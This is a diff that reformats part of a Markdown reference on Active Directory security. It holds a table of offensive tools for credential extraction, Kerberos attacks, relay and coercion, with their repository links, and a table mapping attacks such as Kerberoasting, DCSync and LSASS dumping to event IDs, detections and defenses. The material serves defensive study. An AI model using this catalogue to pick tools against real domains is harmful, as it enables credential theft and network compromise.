-- **Detection**: Events 4886 (certificate requested), 4887 (certificate issued), 4768/4769 with machine account for unexpected hosts; CA audit logging enabled
-- **Defense**: Disable Web Enrollment or require HTTPS with EPA; disable EDITF_ATTRIBUTESUBJECTALTNAME2; review template ACLs; enable CA audit logging; use Certipy or PKI Health Tool regularly
+- Detection: Events 4886 (certificate requested), 4887 (certificate issued), 4768/4769 with machine account for unexpected hosts; CA audit logging enabled
+- Defense: Disable Web Enrollment or require HTTPS with EPA; disable EDITF_ATTRIBUTESUBJECTALTNAME2; review template ACLs; enable CA audit logging; use Certipy or PKI Health Tool regularly
 
 ---
 
@@ -1193,30 +1193,30 @@ Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Confi
 
 | Tool | Purpose | Platform | Source |
 |------|---------|----------|--------|
-| **BloodHound** | Attack path analysis / graph visualization | Windows/Linux | github.com/BloodHoundAD/BloodHound |
-| **SharpHound** | BloodHound data collector (.NET) | Windows | github.com/BloodHoundAD/SharpHound |
-| **bloodhound-python** | Python BloodHound collector | Linux | github.com/fox-it/BloodHound.py |
-| **PowerView** | AD enumeration (PowerShell) | Windows | github.com/PowerShellMafia/PowerSploit |
-| **Rubeus** | Kerberos attack toolkit (.NET) | Windows | github.com/GhostPack/Rubeus |
-| **Mimikatz** | Credential extraction, ticket attacks | Windows | github.com/gentilkiwi/mimikatz |
-| **Impacket** | Full AD attack suite (Python) | Linux | github.com/fortra/impacket |
-| **NetExec (nxc)** | AD pentesting automation | Linux/Windows | github.com/Pennyw0rth/NetExec |
-| **CrackMapExec** | AD pentesting; deprecated original (archived Dec 2023) — NetExec (nxc) is the maintained fork/successor | Linux | github.com/byt3bl33d3r/CrackMapExec |
-| **Certipy** | ADCS attack and enumeration | Linux | github.com/ly4k/Certipy |
-| **Responder** | LLMNR/NBT-NS/mDNS/WPAD poisoning | Linux | github.com/lgandx/Responder |
-| **Evil-WinRM** | WinRM shell with upload/download | Linux | github.com/Hackplayers/evil-winrm |
-| **kerbrute** | Kerberos user enum + password spray | Linux/Windows | github.com/ropnop/kerbrute |
-| **ldapdomaindump** | LDAP enumeration to HTML/JSON/CSV | Linux | github.com/dirkjanm/ldapdomaindump |
-| **PingCastle** | AD security audit and scoring | Windows | pingcastle.com |
-| **ADRecon** | Comprehensive AD recon (PowerShell) | Windows | github.com/adrecon/ADRecon |
-| **Powermad** | Machine account creation + AD manipulation | Windows | github.com/Kevin-Robertson/Powermad |
-| **Coercer** | Authentication coercion (multi-protocol) | Linux | github.com/p0dalirius/Coercer |
-| **mitm6** | IPv6 DNS poisoning for NTLM relay | Linux | github.com/dirkjanm/mitm6 |
-| **pypykatz** | Mimikatz reimplementation in Python | Linux | github.com/skelsec/pypykatz |
-| **SharpDPAPI** | DPAPI secrets, credential files, certificates | Windows | github.com/GhostPack/SharpDPAPI |
-| **SpoolSample** | PrinterBug / authentication coercion | Windows | github.com/leechristensen/SpoolSample |
-| **PetitPotam** | EFSRPC-based coercion (unauth in some versions) | Linux | github.com/topotam/PetitPotam |
-| **lsassy** | Remote LSASS dump parser | Linux | github.com/Hackndo/lsassy |
+| BloodHound | Attack path analysis / graph visualization | Windows/Linux | github.com/BloodHoundAD/BloodHound |
+| SharpHound | BloodHound data collector (.NET) | Windows | github.com/BloodHoundAD/SharpHound |
+| bloodhound-python | Python BloodHound collector | Linux | github.com/fox-it/BloodHound.py |
+| PowerView | AD enumeration (PowerShell) | Windows | github.com/PowerShellMafia/PowerSploit |
+| Rubeus | Kerberos attack toolkit (.NET) | Windows | github.com/GhostPack/Rubeus |
+| Mimikatz | Credential extraction, ticket attacks | Windows | github.com/gentilkiwi/mimikatz |
+| Impacket | Full AD attack suite (Python) | Linux | github.com/fortra/impacket |
+| NetExec (nxc) | AD pentesting automation | Linux/Windows | github.com/Pennyw0rth/NetExec |
+| CrackMapExec | AD pentesting; deprecated original (archived Dec 2023) — NetExec (nxc) is the maintained fork/successor | Linux | github.com/byt3bl33d3r/CrackMapExec |
+| Certipy | ADCS attack and enumeration | Linux | github.com/ly4k/Certipy |
+| Responder | LLMNR/NBT-NS/mDNS/WPAD poisoning | Linux | github.com/lgandx/Responder |
+| Evil-WinRM | WinRM shell with upload/download | Linux | github.com/Hackplayers/evil-winrm |
+| kerbrute | Kerberos user enum + password spray | Linux/Windows | github.com/ropnop/kerbrute |
+| ldapdomaindump | LDAP enumeration to HTML/JSON/CSV | Linux | github.com/dirkjanm/ldapdomaindump |
+| PingCastle | AD security audit and scoring | Windows | pingcastle.com |
+| ADRecon | Comprehensive AD recon (PowerShell) | Windows | github.com/adrecon/ADRecon |
+| Powermad | Machine account creation + AD manipulation | Windows | github.com/Kevin-Robertson/Powermad |
+| Coercer | Authentication coercion (multi-protocol) | Linux | github.com/p0dalirius/Coercer |
+| mitm6 | IPv6 DNS poisoning for NTLM relay | Linux | github.com/dirkjanm/mitm6 |
+| pypykatz | Mimikatz reimplementation in Python | Linux | github.com/skelsec/pypykatz |
+| SharpDPAPI | DPAPI secrets, credential files, certificates | Windows | github.com/GhostPack/SharpDPAPI |
+| SpoolSample | PrinterBug / authentication coercion | Windows | github.com/leechristensen/SpoolSample |
+| PetitPotam | EFSRPC-based coercion (unauth in some versions) | Linux | github.com/topotam/PetitPotam |
+| lsassy | Remote LSASS dump parser | Linux | github.com/Hackndo/lsassy |
 
 ---
 
@@ -1224,21 +1224,21 @@ Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Confi
 
 | Attack | ATT&CK ID | Key Event IDs | Detection Method | Primary Defense |
 |--------|-----------|---------------|-----------------|-----------------|
-| **Kerberoasting** | T1558.003 | 4769 (RC4, high volume) | TGS requests with EType 0x17 from non-DC source | gMSA; AES-only for SPN accounts |
-| **AS-REP Roasting** | T1558.004 | 4768 (PreAuth=0) | TGT requests with PreAuth type 0 | Require pre-auth on all accounts |
-| **Golden Ticket** | T1558.001 | 4769 (anomalous params) | Ticket lifetime >10h, KVNO anomaly | Rotate krbtgt 2x; Credential Guard |
-| **Silver Ticket** | T1558.002 | No 4768/4769 from DC | Missing corresponding TGS request | PAC validation; rotate svc passwords |
-| **DCSync** | T1003.006 | 4662 (GUID match) | Replication from non-DC IP | Tier 0 access; monitor 4662 |
-| **Pass-the-Hash** | T1550.002 | 4624 Type3 NTLM | NTLM auth from unexpected source | Credential Guard; Protected Users |
-| **LLMNR Poisoning** | T1557.001 | Network traffic | LLMNR response from non-DNS server | Disable LLMNR/NBT-NS |
-| **NTLM Relay** | T1557.001 | Network traffic | Relay pattern in network logs | SMB signing required; EPA |
-| **ADCS ESC1** | T1649 | 4886, 4887 | Cert issued with unexpected SAN | Disable enrollee supplies subject |
-| **BloodHound/enum** | T1087.002 | High LDAP query volume | AD audit + UEBA baseline deviation | LDAP query rate limiting; canary accounts |
-| **Unconstrained Deleg.** | T1558 | 4769 (machine account TGT) | Machine account authenticating to non-standard host | Remove unconstrained delegation; monitor |
-| **WMI Persistence** | T1546.003 | Sysmon 19/20/21 | WMI subscription creation | Monitor WMI subscriptions; restrict WMI |
-| **AdminSDHolder** | T1546 | 4662 (SDProp) | ACE added to AdminSDHolder | Monitor AdminSDHolder ACL changes |
-| **LSASS Dump** | T1003.001 | Sysmon 10 (LSASS access) | ProcessAccess to lsass.exe | Credential Guard; PPL; ASR rules |
-| **Password Spray** | T1110.003 | 4625 (burst from one IP) | Failed logon spike; smart lockout trigger | Smart lockout; Entra Password Protection |
+| Kerberoasting | T1558.003 | 4769 (RC4, high volume) | TGS requests with EType 0x17 from non-DC source | gMSA; AES-only for SPN accounts |
+| AS-REP Roasting | T1558.004 | 4768 (PreAuth=0) | TGT requests with PreAuth type 0 | Require pre-auth on all accounts |
+| Golden Ticket | T1558.001 | 4769 (anomalous params) | Ticket lifetime >10h, KVNO anomaly | Rotate krbtgt 2x; Credential Guard |
+| Silver Ticket | T1558.002 | No 4768/4769 from DC | Missing corresponding TGS request | PAC validation; rotate svc passwords |
+| DCSync | T1003.006 | 4662 (GUID match) | Replication from non-DC IP | Tier 0 access; monitor 4662 |
+| Pass-the-Hash | T1550.002 | 4624 Type3 NTLM | NTLM auth from unexpected source | Credential Guard; Protected Users |
+| LLMNR Poisoning | T1557.001 | Network traffic | LLMNR response from non-DNS server | Disable LLMNR/NBT-NS |
+| NTLM Relay | T1557.001 | Network traffic | Relay pattern in network logs | SMB signing required; EPA |
+| ADCS ESC1 | T1649 | 4886, 4887 | Cert issued with unexpected SAN | Disable enrollee supplies subject |
+| BloodHound/enum | T1087.002 | High LDAP query volume | AD audit + UEBA baseline deviation | LDAP query rate limiting; canary accounts |
+| Unconstrained Deleg. | T1558 | 4769 (machine account TGT) | Machine account authenticating to non-standard host | Remove unconstrained delegation; monitor |
+| WMI Persistence | T1546.003 | Sysmon 19/20/21 | WMI subscription creation | Monitor WMI subscriptions; restrict WMI |
+| AdminSDHolder | T1546 | 4662 (SDProp) | ACE added to AdminSDHolder | Monitor AdminSDHolder ACL changes |
+| LSASS Dump | T1003.001 | Sysmon 10 (LSASS access) | ProcessAccess to lsass.exe | Credential Guard; PPL; ASR rules |
+| Password Spray | T1110.003 | 4625 (burst from one IP) | Failed logon spike; smart lockout trigger | Smart lockout; Entra Password Protection |
 
 ### Event ID Quick Reference
 
@@ -1294,12 +1294,12 @@ Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Confi
 
 ## References
 
-- [MITRE ATT&CK Enterprise — Credential Access](https://attack.mitre.org/tactics/TA0006/)
-- [SpecterOps — Certified Pre-Owned (ADCS)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
-- [Microsoft — Protecting Privileged Accounts](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models)
+- [MITRE ATT&CK Enterprise: Credential Access](https://attack.mitre.org/tactics/TA0006/)
+- [SpecterOps: Certified Pre-Owned (ADCS)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+- [Microsoft: Protecting Privileged Accounts](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models)
 - [BloodHound Documentation](https://bloodhound.readthedocs.io/)
-- [Harmj0y — The Trustpocalypse (Domain Trusts)](https://www.harmj0y.net/blog/redteaming/the-trustpocalypse/)
-- [gentilkiwi — Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki)
+- [Harmj0y: The Trustpocalypse (Domain Trusts)](https://www.harmj0y.net/blog/redteaming/the-trustpocalypse/)
+- [gentilkiwi: Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki)
 - [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
-- [adsecurity.org — Sean Metcalf's AD Security Research](https://adsecurity.org/)
-- [dirkjanm.io — Kerberos, NTLM, and AD Research](https://dirkjanm.io/)
+- [adsecurity.org: Sean Metcalf's AD Security Research](https://adsecurity.org/)
+- [dirkjanm.io: Kerberos, NTLM, and AD Research](https://dirkjanm.io/)
